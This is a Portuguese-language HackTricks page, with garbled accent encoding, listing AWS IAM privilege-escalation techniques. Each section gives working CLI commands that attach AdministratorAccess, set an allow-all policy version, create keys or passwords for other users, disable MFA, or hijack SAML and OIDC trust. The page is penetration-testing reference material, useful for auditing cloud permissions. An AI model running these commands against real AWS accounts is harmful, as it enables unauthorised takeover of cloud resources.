# AWS - Escala√ß√£o de Privil√©gios do IAM

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## IAM

Para mais informa√ß√µes sobre o IAM, consulte:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

Um invasor com a permiss√£o **`iam:CreatePolicyVersion`** pode criar uma **nova vers√£o de uma pol√≠tica IAM √† qual eles t√™m acesso**. Isso permite que eles definam suas **pr√≥prias permiss√µes personalizadas**. Ao criar uma nova vers√£o de pol√≠tica, ela precisa ser **definida como a vers√£o padr√£o para entrar em vigor**, o que normalmente exigiria a permiss√£o `iam:SetDefaultPolicyVersion`. No entanto, ao criar uma nova vers√£o de pol√≠tica, √© poss√≠vel incluir uma flag (**`--set-as-default`**) que a criar√° automaticamente como a **nova vers√£o padr√£o**. Essa flag **n√£o requer** a permiss√£o `iam:SetDefaultPolicyVersion` para ser usada.

Um exemplo de comando para explorar esse m√©todo pode ser assim:
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
Onde o arquivo `policy.json` incluiria um **documento de pol√≠tica que permite qualquer a√ß√£o em qualquer recurso na conta**.

**Impacto Potencial:** Escala√ß√£o direta de privil√©gios para tudo.

### `iam:SetDefaultPolicyVersion`

Um atacante com a permiss√£o **`iam:SetDefaultPolicyVersion`** pode ser capaz de escalar privil√©gios atrav√©s de **vers√µes de pol√≠tica existentes que n√£o est√£o em uso atualmente**. Se uma **pol√≠tica √† qual eles t√™m acesso** tiver vers√µes que **n√£o s√£o a padr√£o**, eles poder√£o alterar a vers√£o padr√£o para qualquer outra vers√£o existente.

{% hint style="warning" %}
Se a **pol√≠tica** que voc√™ est√° **modificando** a vers√£o √© a mesma que est√° **concedendo** ao atacante a permiss√£o `SetDefaultPolicyVersion`, e a **nova vers√£o n√£o concede** essa permiss√£o, o atacante **n√£o poder√° retornar a pol√≠tica ao seu estado original**.
{% endhint %}

Um exemplo de comando para explorar esse m√©todo pode ser assim:
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
Onde "v2" √© a vers√£o da pol√≠tica com mais privil√©gios dispon√≠veis.

**Impacto Potencial:** Privesc indireto definindo uma vers√£o de pol√≠tica diferente que poderia conceder mais permiss√µes.

### `iam:CreateAccessKey`

Um atacante com a permiss√£o **`iam:CreateAccessKey`** em outros usu√°rios pode **criar um ID de chave de acesso e uma chave de acesso secreta pertencentes a outro usu√°rio** no ambiente AWS, se eles ainda n√£o tiverem dois conjuntos associados a eles (o que √© recomendado pelas melhores pr√°ticas).

Um exemplo de comando para explorar esse m√©todo pode ser assim:
```bash
aws iam create-access-key --user-name <target_user>
```
Onde o target\_user tem um conjunto estendido de permiss√µes em compara√ß√£o com o usu√°rio atual.

**Impacto Potencial:** Privesc direto para qualquer usu√°rio.

### `iam:CreateLoginProfile`

Um atacante com a permiss√£o `iam:CreateLoginProfile` em outros usu√°rios pode **criar uma senha** para usar para **fazer login** no console da AWS em **qualquer usu√°rio que ainda n√£o tenha um perfil de login configurado**.

Um exemplo de comando para explorar esse m√©todo pode ser assim:
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
Essa senha garante que ela atenda aos **requisitos m√≠nimos de senha da conta**.

**Impacto Potencial:** Privesc direto para "qualquer" usu√°rio.

### `iam:UpdateLoginProfile`

Um atacante com a permiss√£o **`iam:UpdateLoginProfile`** em outros usu√°rios pode **alterar a senha usada para fazer login no console da AWS** em qualquer usu√°rio que **j√° tenha um perfil de login configurado**.

Assim como criar um perfil de login, um comando de exemplo para explorar esse m√©todo pode ser assim:
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
Essa senha garante que ela atenda aos **requisitos m√≠nimos de senha da conta**.

**Impacto Potencial:** Privesc direto de "qualquer" usu√°rio.

### `iam:UpdateAccessKey`

Um atacante com **`iam:UpdateAccessKey`** poderia **habilitar uma chave de acesso desativada** e us√°-la (ele precisaria ter a chave de acesso desativada)

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**Impacto Potencial:** Privesc direto para acessar a chave do usu√°rio (precisando ter a chave).

### `iam:CreateServiceSpecificCredential`

Permite **gerar** um **nome de usu√°rio** e uma **senha** que podem ser usados para **acessar o servi√ßo especificado** na solicita√ß√£o (**CodeCommit ou Amazon Keyspaces** - Apache Cassandra).

As novas credenciais espec√≠ficas do servi√ßo t√™m as **mesmas permiss√µes do usu√°rio associado**, exceto que podem ser usadas apenas para acessar o servi√ßo especificado.

√â poss√≠vel ter apenas um **m√°ximo de duas conjuntos de credenciais espec√≠ficas do servi√ßo para cada** servi√ßo suportado por usu√°rio.

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
**Impacto Potencial:** Escala√ß√£o direta de privil√©gios para permiss√µes de servi√ßo do usu√°rio.

### `iam:ResetServiceSpecificCredential`

Semelhante ao **`iam:CreateServiceSpecificCredential`**, mas em vez de criar novas credenciais, redefine uma existente.&#x20;

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
{% endcode %}

**Impacto Potencial:** Escala√ß√£o direta de privil√©gios para permiss√µes de servi√ßo do usu√°rio.

### `iam:AttachUserPolicy`

Um atacante com a permiss√£o **`iam:AttachUserPolicy`** pode escalar privil√©gios **anexando uma pol√≠tica a um usu√°rio ao qual eles t√™m acesso**, adicionando as permiss√µes dessa pol√≠tica ao atacante.

Um exemplo de comando para explorar esse m√©todo pode ser assim:
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**Impacto Potencial:** Escala√ß√£o direta de privil√©gios para qualquer coisa.

### `iam:AttachGroupPolicy`

Um atacante com a permiss√£o **`iam:AttachGroupPolicy`** pode escalar privil√©gios **anexando uma pol√≠tica a um grupo** do qual faz parte, adicionando as permiss√µes dessa pol√≠tica ao atacante.
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Onde o grupo √© um grupo do qual o usu√°rio atual faz parte.

**Impacto Potencial:** Escala√ß√£o direta de privil√©gios para qualquer coisa (se o usu√°rio estiver dentro de um grupo).

### `iam:AttachRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

Um atacante com a permiss√£o **`iam:AttachRolePolicy`** pode escalar privil√©gios **anexando uma pol√≠tica a uma fun√ß√£o** √† qual eles t√™m acesso, adicionando as permiss√µes dessa pol√≠tica ao atacante.
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
Onde o papel √© um papel que o usu√°rio atual pode assumir temporariamente com `sts:AssumeRole`.

**Impacto Potencial:** Privesc direto para qualquer coisa.

### `iam:PutUserPolicy`

Um atacante com a permiss√£o `iam:PutUserPolicy` pode **elevar privil√©gios criando ou atualizando uma pol√≠tica interna para um usu√°rio** ao qual eles t√™m acesso, adicionando as permiss√µes dessa pol√≠tica ao atacante.
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
Voc√™ pode usar uma pol√≠tica como:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**Potencial Impacto:** Escala√ß√£o direta de privil√©gios para qualquer coisa.

### `iam:PutGroupPolicy`

Um atacante com a permiss√£o `iam:PutGroupPolicy` pode escalar privil√©gios **criando ou atualizando uma pol√≠tica interna para um grupo do qual faz parte**, adicionando as permiss√µes dessa pol√≠tica ao atacante.
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
Onde o grupo √© **um grupo em que o usu√°rio atual est√°**.

**Impacto Potencial:** Privesc direto para qualquer coisa.

### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

Um atacante com a permiss√£o **`iam:PutRolePolicy`** pode elevar privil√©gios **criando ou atualizando uma pol√≠tica interna para uma fun√ß√£o √† qual eles t√™m acesso**, adicionando as permiss√µes dessa pol√≠tica ao atacante.

Um exemplo de comando para explorar esse m√©todo pode ser assim:
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
Onde o papel √© um papel que o usu√°rio atual pode assumir temporariamente com `sts:AssumeRole`.

**Impacto Potencial:** Privesc direto para qualquer coisa.

### `iam:AddUserToGroup`

Um atacante com a permiss√£o **`iam:AddUserToGroup`** pode us√°-la para **adicionar-se a um Grupo IAM existente** na conta da AWS.
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
Onde **target\_group tem mais/diferentes privil√©gios** do que a conta de usu√°rio do atacante.

**Impacto Potencial:** Privesc direto para qualquer grupo.

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

Um atacante com as permiss√µes `iam:UpdateAssumeRolePolicy` e `sts:AssumeRole` seria capaz de **alterar o documento de pol√≠tica de assumir fun√ß√£o de qualquer fun√ß√£o existente** para permitir que eles assumam essa fun√ß√£o.
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
Quando a pol√≠tica se parece com a seguinte, que concede permiss√£o ao usu√°rio para assumir a fun√ß√£o:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impacto Potencial:** Escala√ß√£o direta de privil√©gios para qualquer fun√ß√£o.

### `iam:UploadSSHPublicKey`

Um atacante com `iam:DeactivateMFADevice` pode fazer o upload de uma **chave p√∫blica SSH e associ√°-la ao usu√°rio IAM especificado** ([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)).

A chave p√∫blica SSH enviada por essa opera√ß√£o pode ser usada apenas para **autenticar o usu√°rio IAM associado a um reposit√≥rio CodeCommit**. Para obter mais informa√ß√µes sobre o uso de chaves SSH para autentica√ß√£o em um reposit√≥rio CodeCommit, consulte [Configurar o CodeCommit para conex√µes SSH](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html) no _Guia do Usu√°rio do CodeCommit_.
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**Potencial Impacto:** Privesc indireto para o CodeCommit.

### `iam:DeactivateMFADevice`

Um atacante com `iam:DeactivateMFADevice` pode **desativar o dispositivo MFA especificado** e remover sua associa√ß√£o com o usu√°rio IAM para o qual ele foi originalmente habilitado ([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)).
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**Potencial Impacto:** Privesc indireto de um usu√°rio se voc√™ j√° conhece seu nome de usu√°rio e senha, desabilitando o dispositivo MFA.

### `iam:ResyncMFADevice`

Um atacante com `iam:ResyncMFADevice` pode **sincronizar o dispositivo MFA especificado** com uma entidade IAM: usu√°rio ou fun√ß√£o ([Saiba mais](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)).
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**Potencial Impacto:** Privesc indireto de um usu√°rio se voc√™ j√° conhece o nome de usu√°rio e senha dele, adicionando um dispositivo MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Com essas permiss√µes, voc√™ pode **alterar o metadado XML da conex√£o SAML**. Em seguida, voc√™ pode abusar da **federa√ß√£o SAML** para **fazer login** com qualquer **fun√ß√£o que confie** nela.

Observe que, ao fazer isso, **usu√°rios leg√≠timos n√£o poder√£o fazer login**. No entanto, voc√™ pode obter o XML, para que possa inserir o seu, fazer login e configurar o anterior novamente.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: Uma ferramenta capaz de gerar os metadados SAML e fazer login com uma fun√ß√£o especificada
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Incerto sobre isso) Se um atacante tiver essas **permiss√µes**, ele poder√° adicionar uma nova **Thumbprint** para conseguir fazer login em todas as fun√ß√µes que confiam no provedor.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no GitHub.

</details>
